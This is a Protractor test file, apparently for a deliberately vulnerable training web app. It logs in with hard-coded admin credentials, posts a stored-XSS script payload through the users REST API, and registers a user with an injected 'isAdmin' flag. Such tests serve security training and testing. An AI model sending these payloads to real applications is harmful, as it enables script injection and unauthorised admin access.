describe('/#/register', () => {
  const config = require('config')
  protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

  beforeEach(() => {
    browser.get('/#/register')
  })

  describe('challenge "xss2"', () => {
    xit('should be possible to bypass validation by directly using Rest API', () => {
      const EC = protractor.ExpectedConditions

      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/api/Users\', {email: \'<script>alert("XSS")</script>\', password: \'xss\'});')

      browser.get('/#/administration')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('XSS')
        alert.accept()
      })
    })

    // protractor.expect.challengeSolved({challenge: 'XSS Tier 2'})
  })

  describe('challenge "registerAdmin"', () => {
    xit('should be possible to register admin user using REST API', () => {
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/api/Users/\', {"email": \'testing@test.com\', "password": \'pwned\',"isAdmin":true});')
    })
    // protractor.expect.challengeSolved({challenge: 'Admin Registration'})
  })
})
